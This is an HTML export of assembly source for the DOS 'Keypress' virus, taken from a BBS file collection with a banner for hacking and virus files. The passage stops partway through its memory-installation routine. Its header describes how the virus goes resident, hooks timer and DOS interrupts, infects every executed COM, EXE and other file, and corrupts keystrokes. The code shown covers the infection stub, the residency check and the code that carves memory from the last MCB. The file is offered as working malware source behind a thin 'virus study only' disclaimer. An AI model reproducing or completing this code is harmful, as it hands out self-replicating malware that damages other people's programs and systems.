<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;****************************************************************************;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">;                     -=][][][][][][][][][][][][][][][=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]  P E R F E C T  C R I M E  [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]      +31.(o)79.426o79      [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]                            [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=] For All Your H/P/A/V Files [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]    SysOp: Peter Venkman    [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]                            [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]      +31.(o)79.426o79      [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]  P E R F E C T  C R I M E  [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=][][][][][][][][][][][][][][][=-                     ;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;</span><span class="sc0">
</span><span class="sc1">; Around Among the General Public. It Will be Very Useful for Learning how   ;</span><span class="sc0">
</span><span class="sc1">; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;</span><span class="sc0">
</span><span class="sc1">; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;</span><span class="sc0">
</span><span class="sc1">; Experience can Turn it Into a far More Malevolent Program Than it Already  ;</span><span class="sc0">
</span><span class="sc1">; Is. Keep This Code in Responsible Hands!                                   ;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">;****************************************************************************;</span><span class="sc0">
</span><span class="sc1">;********************************************************</span><span class="sc0">
</span><span class="sc1">; Source code of the Keypress Virus - Made by XSTC</span><span class="sc0">
</span><span class="sc1">; Made in A86 v3.07</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The Keypress Virus installs itself in top of DOS</span><span class="sc0">
</span><span class="sc1">; memory, without using DOS resident functions. It will</span><span class="sc0">
</span><span class="sc1">; hook int 1Ch (timer) and 21h (DOS) and will copy every</span><span class="sc0">
</span><span class="sc1">; 10 minutes during 2 seconds the keys you press five</span><span class="sc0">
</span><span class="sc1">; times (so if you press '1' it will be '111111') - if</span><span class="sc0">
</span><span class="sc1">; you press no key, it will usually give ESCs.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; In DOS 3+ it spreads to every file executed - so it</span><span class="sc0">
</span><span class="sc1">; can, besides COM/EXE, infect DRV/OVL/etc.</span><span class="sc0">
</span><span class="sc1">; It also spreads itself in DOS 1 and 2 with a special</span><span class="sc0">
</span><span class="sc1">; routine - in this case only COM/EXE files will be</span><span class="sc0">
</span><span class="sc1">; infected.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; It adds, after making full paragraphs of the file</span><span class="sc0">
</span><span class="sc1">; length, 1232 bytes to COM-files and 1216 to EXE.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This code is only made to show the possibilities and</span><span class="sc0">
</span><span class="sc1">; dangers of a virus. It is only intended for research</span><span class="sc0">
</span><span class="sc1">; purposes - spreading a virus is prohibited by law.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; NOTE - The compiled code is not 100% compatible with</span><span class="sc0">
</span><span class="sc1">; the Keypress virus. A86 compiles the 'ADD BX,AX' and</span><span class="sc0">
</span><span class="sc1">; 'MOV DI,SI' different. This has totally no effect</span><span class="sc0">
</span><span class="sc1">; on the program.</span><span class="sc0">
</span><span class="sc1">;********************************************************</span><span class="sc0">

</span><span class="sc1">; After compiling the new virus, enter the new size in paragraphs in VirParSize</span><span class="sc0">
</span><span class="sc1">; and compile again.</span><span class="sc0">

</span><span class="sc5">VirParSize</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc0">                      </span><span class="sc1">; Size of the original KeyPress virus</span><span class="sc0">

</span><span class="sc5">VirStart</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">long</span><span class="sc0"> </span><span class="sc5">VirBegin</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ComStart</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">               </span><span class="sc1">; When the virus has infected a .COM file,</span><span class="sc0">
              </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc2">102h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; this is the jump to the virus. Actually,</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">; this code is overwritten with the code</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirBegin</span><span class="sc0">                  </span><span class="sc1">; in the end of the virus.</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc5">EB02</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">02EBh</span><span class="sc0">                  </span><span class="sc1">; 'jmp 104' - first 2 bytes in .COM file</span><span class="sc0">

</span><span class="sc5">VirSize</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">VirParSize</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                  </span><span class="sc1">; Size of virus in whole pars</span><span class="sc0">

</span><span class="sc5">VirPars</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">VirParSize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                        </span><span class="sc1">; Size of virus in pars+1</span><span class="sc0">

</span><span class="sc5">MaxComSize</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0FF00h</span><span class="sc4">-</span><span class="sc5">VirParSize</span><span class="sc0">  </span><span class="sc1">; Max. size .COM file to infect (100h stack)</span><span class="sc0">

</span><span class="sc5">Com_or_exe</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">                                </span><span class="sc1">; 0 = Com-File, 1 = Exe-File</span><span class="sc0">
</span><span class="sc5">R_Ax</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">R_Bx</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">R_Cx</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">R_Dx</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">R_Di</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">R_Si</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">R_Bp</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">R_Es</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">R_Ds</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">R_SS</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">R_SP</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Exe_CS</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Exe_IP</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc5">VirBegin</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Save_Regs</span><span class="sc0">                                    </span><span class="sc1">; Start of virus</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Fix_cs_ss</span><span class="sc0">      </span><span class="sc1">; Fix CS and SS of orig. prog (for .EXE files)</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Get_cs_ip</span><span class="sc0">                    </span><span class="sc1">; Get CS and IP of original prog</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Check_res</span><span class="sc0">                      </span><span class="sc1">; Check virus already resident</span><span class="sc0">
              </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">Exit_inst</span><span class="sc0">                                           </span><span class="sc1">; Yes, quit</span><span class="sc0">

              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Inst_mem</span><span class="sc0">                                  </span><span class="sc1">; Install in memory</span><span class="sc0">
              </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">Exit_inst</span><span class="sc0">                                         </span><span class="sc1">; Error, quit</span><span class="sc0">

              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Inst_ints</span><span class="sc0">                                   </span><span class="sc1">; Hook interrupts</span><span class="sc0">
</span><span class="sc5">Exit_Inst</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Rst_regs_prg</span><span class="sc0">
              </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">Jmp_Prg</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">                                 </span><span class="sc1">; Jump to original program</span><span class="sc0">
</span><span class="sc5">PrgOfs</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">PrgSeg</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Check_res</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
              </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">600h</span><span class="sc0">                                </span><span class="sc1">; Unused word in memory</span><span class="sc0">
              </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">                           </span><span class="sc1">; Already installed?</span><span class="sc0">
              </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Installed</span><span class="sc0">                                                 </span><span class="sc1">; Yes</span><span class="sc0">

              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">                                           </span><span class="sc1">; No</span><span class="sc0">
              </span><span class="sc6">stc</span><span class="sc0">

</span><span class="sc5">Installed</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmc</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*** For .EXE: Fix orig-prog CS and SS ***</span><span class="sc0">

</span><span class="sc5">Fix_cs_ss</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Com_or_exe</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
              </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">no_exe</span><span class="sc0">

              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
              </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
              </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc5">Exe_cs</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
              </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc5">R_ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">No_Exe</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*** Get CS + IP of orig. program, and for .COM: Restore first 16 bytes ***</span><span class="sc0">

</span><span class="sc5">Get_cs_ip</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">Exe_cs</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">Exe_ip</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Com_or_exe</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
              </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">No_rest</span><span class="sc0">                 </span><span class="sc1">; .EXE file: no restore of first bytes</span><span class="sc0">

              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">First_bytes</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
              </span><span class="sc6">cld</span><span class="sc0">
              </span><span class="sc6">repz</span><span class="sc0">                          </span><span class="sc1">; Restore first 16 bytes (.COM file)</span><span class="sc0">
              </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc5">No_rest</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Prgseg</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Prgofs</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*** Proc: Save the registers to restore them after the virus has ended ***</span><span class="sc0">

</span><span class="sc5">Save_Regs</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">R_ds</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">R_ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">R_bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">R_cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">R_dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">R_di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">R_si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">R_bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">R_es</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*** Restore regs for original program ***</span><span class="sc0">

</span><span class="sc5">Rst_regs_prg</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">R_ax</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">R_bx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">R_cx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">R_dx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc5">R_bp</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">R_di</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">R_si</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc5">R_es</span><span class="sc0">
              </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Com_or_exe</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
              </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">No_StackRest</span><span class="sc0">                  </span><span class="sc1">; No stack restore for .COM files</span><span class="sc0">

              </span><span class="sc6">cli</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,[</span><span class="sc5">R_ss</span><span class="sc4">]</span><span class="sc0">                                 </span><span class="sc1">; Restore .EXE stack</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,[</span><span class="sc5">R_sp</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">sti</span><span class="sc0">

</span><span class="sc5">No_StackRest</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc5">R_ds</span><span class="sc0">
              </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">jmp_prg</span><span class="sc0">


</span><span class="sc1">;*** Restore regs for interrupts ***</span><span class="sc0">

</span><span class="sc5">Rst_regs_int</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">R_ax</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">R_bx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">R_cx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">R_dx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc5">R_bp</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">R_di</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">R_si</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc5">R_es</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc5">R_ds</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*** Proc: Search for last MCB ***</span><span class="sc0">

</span><span class="sc5">Last_MCB</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
              </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc5">Next_MCB</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc2">5Ah</span><span class="sc0">                                   </span><span class="sc1">; Last MCB?</span><span class="sc0">
              </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Is_last</span><span class="sc0">                                                   </span><span class="sc1">; Yes</span><span class="sc0">
              </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">                                            </span><span class="sc1">; Go to next</span><span class="sc0">
              </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0A000h</span><span class="sc0">                                            </span><span class="sc1">; In ROM?</span><span class="sc0">
              </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">Next_MCB</span><span class="sc0">                                     </span><span class="sc1">; No, try next one</span><span class="sc0">

</span><span class="sc5">Is_Last</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*** Proc: Install virus in end of memory ***</span><span class="sc0">

</span><span class="sc5">Inst_Mem</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Last_mcb</span><span class="sc0">                                    </span><span class="sc1">; Search last MCB</span><span class="sc0">
              </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0A000h</span><span class="sc0">                                            </span><span class="sc1">; In ROM?</span><span class="sc0">
              </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">Not_ROM</span><span class="sc0">                                          </span><span class="sc1">; No, continue</span><span class="sc0">

</span><span class="sc5">No_Inst</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                                                </span><span class="sc1">; Yes, quit</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
              </span><span class="sc6">stc</span><span class="sc0">                                   </span><span class="sc1">; Error, virus not installed</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Not_ROM</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">                                    </span><span class="sc1">; AX = Size last MCB</span><span class="sc0">
              </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">VirPars</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; - (Virussize in pars+1)</span><span class="sc0">
              </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">no_inst</span><span class="sc0">                              </span><span class="sc1">; Not enough memory, quit</span><span class="sc0">
              </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">800h</span><span class="sc0">
              </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">no_inst</span><span class="sc0">                        </span><span class="sc1">; Less than 2048 pars free, quit</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; Give program less space to install virus</span><span class="sc0">
              </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
              </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                                </span><span class="sc1">; BX = seg where virus comes</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">            </span><span class="sc1">; Enter in PSP, program not allowed there</span><span class="sc0">
              </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                     </span><span class="sc1">; - 10h pars (virus starts at 100h)</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
